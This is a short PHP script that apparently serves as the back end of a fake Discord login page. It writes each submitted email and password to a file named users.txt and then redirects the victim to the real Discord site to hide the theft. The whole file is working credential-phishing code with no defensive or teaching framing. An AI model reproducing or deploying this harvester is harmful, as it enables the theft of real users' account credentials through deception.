<?php 
file_put_contents("users.txt", "[~] Discord user: " . $_POST['email'] . " [~] Password: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://discord.com');
exit();
?>
